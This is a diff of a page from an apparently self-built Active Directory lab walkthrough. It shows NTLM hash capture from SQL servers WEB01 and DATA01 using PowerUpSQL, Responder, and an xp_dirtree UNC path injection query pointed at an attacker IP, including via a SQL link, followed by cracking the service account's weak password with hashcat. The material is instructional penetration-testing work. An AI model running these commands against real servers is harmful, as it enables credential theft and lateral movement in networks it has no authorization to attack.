@@ -50,7 +50,7 @@ The red marking is there from the installation steps, please ignore it.
 
 ![](<../../../.gitbook/assets/image (28).png>)
 
-We will start of from having access to the SQL database running on `Web01` using PowerUpSQL. Check out this page if you forgot how we get access.
+We will start of from having access to the SQL database running on `Web01` using PowerUpSQL. Check out this page if you forgot how we got access.
 
 {% content-ref url="initial-access/normal-domain-user-access.md" %}
 [normal-domain-user-access.md](initial-access/normal-domain-user-access.md)
@@ -64,7 +64,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
 ![](<../../../.gitbook/assets/image (22).png>)
 
-2\. This shows us that the server is running as the service account `ServiceAccount : NT Service\MSSQL$DEV` which means its running with the system account. There is no way we can crack the computer accounts hash since its a long random password that changes every month. We can check if the SQL Server has the vulnerable functions to prevent UNC PATH injection with PowerUpSQL.
+2\. This shows us that the server is running as the service account `NT Service\MSSQL$DEV` which means its running with the system account. There is no way we can crack the computer accounts hash since its a long random password that changes every month. But we can still try to capture it.&#x20;
+
+We can check if the SQL Server has the vulnerable functions to perform UNC PATH injection with PowerUpSQL.
 
 ```
 Get-SQLInstanceDomain | Invoke-SQLAuditPrivXpDirtree
@@ -73,7 +75,7 @@ Get-SQLInstanceDomain | Invoke-SQLAuditPrivXpFileexist
 
 ![](<../../../.gitbook/assets/image (62).png>)
 
-3\. They are available on the `WEB01` SQL server. Before we can capture the hash we should run Responder on our Kali Machine:
+3\. Both methods are available on the `WEB01` SQL server. Before we can capture the hash we should run Responder on our Kali Machine:
 
 ```
 sudo responder -I tun0
@@ -81,29 +83,31 @@ sudo responder -I tun0
 
 ![](<../../../.gitbook/assets/image (52).png>)
 
-4\. We can execute queries on the SQL server with PowerUpSQL and perform a UNC path injection with xp\_dirtree using the following command:
+4\. We can execute queries on the SQL server with PowerUpSQL and perform a UNC path injection with xp\_dirtree using the following command and query:
 
 ```
 Get-SQLQuery -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -Instance web01
 ```
 
-and we receive the hash of the computeraccount on our kali:
+The part `EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1` is the SQL query which will execute the UNC PATH injection attack. After executing the command we receive the hash of the computeraccount on our kali machine:
 
 ![](<../../../.gitbook/assets/image (10).png>)
 
+Since its a computer account hash we wont be able to crack it. How do we know its a computer account hash? Computer accounts ends with a Dollar sign $. We could always double check by quering the domain and check if its a computer of normal user or search it up in the bloodhound data.
+
 #### SQL Server - DATA01
 
-Now lets capture a hash where we can actually do something with. Relaying the SQL Server hash isn't implemented in the lab yet, but we can crack the hash of the SQL server user. During the SQL Server installation on `DATA01` we configured it to run as the domain user `sa_sql`.
+Now lets capture the hash of the DATA01 SQL server service. Relaying the SQL Server hash isn't implemented in the lab yet, but we can crack the hash of the SQL server service. During the SQL Server installation on `DATA01` we configured it to run as the domain user `sa_sql`.
 
 ![](<../../../.gitbook/assets/image (31).png>)
 
-We will start of from having access to the SQL database running on `DATA01` using PowerUpSQL. Check out this page if you forgot how we get access.
+We will start of from having access to the SQL database running on `DATA01` using PowerUpSQL. Check out this page if you forgot how we got access.
 
 {% content-ref url="database-links.md" %}
 [database-links.md](database-links.md)
 {% endcontent-ref %}
 
-1. Running the following query we were able to execute SQL queries on the DATA01 database through the SQL-link configure between WEB01 and DATA01.
+1. Running the following query we were able to execute SQL queries on the `DATA01` database through the SQL-link configure between `WEB01` and `DATA01`.
 
 ```
 Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version' -QueryTarget DATA01\DATA | Select-Object -Property instance -ExpandProperty Customquery
@@ -111,7 +115,7 @@ Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version' -QueryT
 
 ![](<../../../.gitbook/assets/image (58).png>)
 
-2\. With Responder running from the previous capture we can execute the same UNC path injection to capture its hash:
+2\. With Responder running from the previous capture we can execute the same UNC path injection attack to capture its hash, but now through the SQL link.
 
 ```
 sudo responder -I eth0
@@ -138,7 +142,11 @@ Hashcat cracked it within second since the user has a weak password:
 
 ![](<../../../.gitbook/assets/image (9).png>)
 
-The password is correct but the user isn't local admin unfortunetelly.
+The password is correct but the user isn't local admin unfortunately. But the user can be used to exploit something. We will continue with the attack on the following page.
+
+{% content-ref url="../acl-abuses/page-2.md" %}
+[page-2.md](../acl-abuses/page-2.md)
+{% endcontent-ref %}
 
 ## Defending
 
